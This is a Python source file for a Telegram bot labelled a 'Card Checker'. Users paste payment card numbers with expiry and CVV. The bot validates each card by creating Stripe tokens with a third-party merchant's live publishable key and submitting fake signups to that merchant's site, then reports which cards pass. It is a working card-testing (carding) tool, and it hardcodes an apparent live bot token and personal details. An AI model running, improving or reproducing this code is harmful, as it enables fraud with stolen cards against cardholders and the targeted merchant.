import telebot
import requests
import random
import string
import time
import re

BOT_TOKEN = "8072279299:AAHSQpNR0d4PuzY5l9kHAqT61-IjWhNjIAI"
bot = telebot.TeleBot(BOT_TOKEN)

STRIPE_PUBLISHABLE_KEY = "pk_live_gTSPTLXTGXVgIrOkNxFA8F9200HdVDgFMa"
STRIPE_URL = "https://api.stripe.com/v1/tokens"
SIGNUP_PANEL_URL = "https://app.strongproposals.com/signup/panel"
REGISTRATION_SUBMIT_URL = "https://app.strongproposals.com/registration/submit"

def generate_random_email():
    name = ''.join(random.choices(string.ascii_lowercase + string.digits, k=8))
    return f"{name}@gmail.com"

def parse_card_input(text):
    parts = text.strip().split('|')
    if len(parts) != 4:
        return None
    cc, mm, yy, cvv = map(str.strip, parts)
    if not (cc.isdigit() and mm.isdigit() and cvv.isdigit() and (len(yy) == 2 or len(yy) == 4)):
        return None
    if len(yy) == 2:
        yy = "20" + yy
    return cc, mm.zfill(2), yy, cvv

def get_signup_panel_token(session):
    """Fetch the signup panel page and extract the _token value from the HTML form."""
    resp = session.get(SIGNUP_PANEL_URL)
    if resp.status_code != 200:
        return None, f"Failed to get signup panel page: {resp.status_code}"
    # Extract _token from HTML form input
    match = re.search(r'name="_token"\s+value="([^"]+)"', resp.text)
    if not match:
        return None, "Could not find _token in signup panel page"
    return match.group(1), None

def create_stripe_token(cc, mm, yy, cvv):
    """Create Stripe token for the card."""
    guid = ''.join(random.choices(string.ascii_lowercase + string.digits, k=32))
    muid = ''.join(random.choices(string.ascii_lowercase + string.digits, k=32))
    sid = ''.join(random.choices(string.ascii_lowercase + string.digits, k=32))
    time_on_page = str(random.randint(10000, 99999))
    payment_user_agent = "stripe.js/78ef418"

    data = {
        "time_on_page": time_on_page,
        "pasted_fields": "number",
        "guid": guid,
        "muid": muid,
        "sid": sid,
        "key": STRIPE_PUBLISHABLE_KEY,
        "payment_user_agent": payment_user_agent,
        "card[number]": cc,
        "card[cvc]": cvv,
        "card[exp_month]": mm,
        "card[exp_year]": yy,
    }
    headers = {
        "content-type": "application/x-www-form-urlencoded",
        "accept": "application/json",
        "origin": "https://js.stripe.com",
        "referer": "https://js.stripe.com/",
        "user-agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 18_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/130.0.6723.37 Mobile/15E148 Safari/604.1"
    }
    resp = requests.post(STRIPE_URL, data=data, headers=headers)
    try:
        resp_json = resp.json()
    except Exception as e:
        return None, f"Stripe JSON decode error: {str(e)}"
    if "error" in resp_json:
        return None, f"Stripe error: {resp_json['error'].get('message', 'Unknown error')}"
    token = resp_json.get("id")
    if not token or not token.startswith("tok_"):
        return None, "Stripe token not found in response"
    return token, None

def submit_registration(session, token_stripe, _token, cc, mm, yy, cvv, email):
    """Submit registration form with all required data."""
    # Prepare POST data
    data = {
        "_token": _token,
        "first_name": "Peshang",
        "last_name": "Salam",
        "email_confirmation": email,
        "email": email,
        "password_confirmation": "War112233$%",
        "password": "War112233$%",
        "phone": "3144740104",
        "card_number": cc,
        "card-cvc": cvv,
        "month": mm,
        "year": yy,
        "stripe_token": token_stripe,
        "package_id": '11"'  # Note: package_id has a trailing quote in your example; kept as is
    }
    headers = {
        "accept": "*/*",
        "x-requested-with": "XMLHttpRequest",
        "accept-language": "en-US,en;q=0.9",
        "accept-encoding": "gzip, deflate, br",
        "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
        "origin": "https://app.strongproposals.com",
        "referer": SIGNUP_PANEL_URL,
        "user-agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 18_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/130.0.6723.37 Mobile/15E148 Safari/604.1",
        "connection": "keep-alive",
    }
    resp = session.post(REGISTRATION_SUBMIT_URL, data=data, headers=headers)
    return resp.text, resp.status_code

@bot.message_handler(commands=['start'])
def start_handler(message):
    bot.send_message(message.chat.id,
        "💳 StrongProposals Card Checker Bot\n\n"
        "Send one or multiple cards separated by new lines.\n"
        "Each card must be in the format:\n"
        "CC|MM|YY|CVV or CC|MM|YYYY|CVV\n\n"
        "Example:\n"
        "4430510072892235|02|27|809\n"
        "5218531116585093|12|2030|470"
    )

@bot.message_handler(func=lambda message: True)
def card_handler(message):
    cards = message.text.strip().split('\n')
    session = requests.Session()
    for card_line in cards:
        parsed = parse_card_input(card_line)
        if not parsed:
            bot.send_message(message.chat.id, f"❌ Invalid card format: {card_line}")
            continue
        cc, mm, yy, cvv = parsed
        email = generate_random_email()

        # Step 1: Get _token from signup panel page
        _token, err = get_signup_panel_token(session)
        if err:
            bot.send_message(message.chat.id, f"❌ Error getting _token: {err}")
            return

        # Step 2: Create Stripe token
        stripe_token, err = create_stripe_token(cc, mm, yy, cvv)
        if err:
            bot.send_message(message.chat.id, f"❌ Stripe token error: {err}")
            continue

        # Step 3: Submit registration form
        full_response, status_code = submit_registration(session, stripe_token, _token, cc, mm, yy, cvv, email)

        # Prepare summary status
        status = "SUCCESS" if status_code == 200 and "Payment Failed" not in full_response else "FAILED or PAYMENT FAILED"

        # Send full response and status to user
        reply_msg = (
            f"Card: {cc}|{mm}|{yy}|{cvv}\n"
            f"Email: {email}\n"
            f"Status: {status}\n"
            f"HTTP Status Code: {status_code}\n"
            f"Full Response:\n{full_response}"
        )
        bot.send_message(message.chat.id, reply_msg)

        time.sleep(10)  # 10 seconds delay between cards

bot.infinity_polling()